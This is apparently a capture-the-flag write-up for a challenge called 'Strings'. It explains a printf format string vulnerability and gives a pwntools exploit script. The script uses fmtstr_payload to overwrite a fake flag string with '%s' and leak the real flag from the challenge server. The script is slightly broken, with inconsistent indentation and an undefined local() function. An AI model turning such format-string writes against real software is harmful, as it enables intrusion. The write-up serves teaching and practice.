# Strings

We can see format string vulnerability in main()

```c
printf(s);
main2();
```

Then *main2()* is called that reads real flag from file and puts it on stack. Then main2() printf fake flag.

```c
stream = fopen("flag.txt", "r");
fgets(s, 40, stream);
printf("n00bz{f4k3_fl4g}");
```

So to get real flag we need to overflow fake flag and change it to "%s".
It's pretty simple to do using pwntools. Here is the exploit:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import  *
import re, sys, struct

EXE =  "./strings"
TARGET =  "challs.n00bzunit3d.xyz"
PORT =  7150
FRM_OFFSET =  6


def  pwn():    
    elf = ELF(EXE)    
    r.recvuntil(b"Do you love strings? \n")
    payload =  b""
    payload += fmtstr_payload(FRM_OFFSET, {elf.symbols['fake_flag'] : b'%s\00'})
    r.sendline(payload)   
	r.interactive()


def  remote(argv=[], *a, **kw):
    '''Connect to process on remote host.'''
    io=connect(TARGET, PORT)
    if args.GDB:
	    gdb.attach(io, gdbscript=gdbscript)
    return io


def  start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
	    return local(argv, *a, **kw)
    elif args.REMOTE:
	    return remote(argv, *a, **kw)
    

if  __name__  ==  "__main__":
    elf = context.binary = ELF(EXE, checksec=True)
    r = start()
    pwn()
```
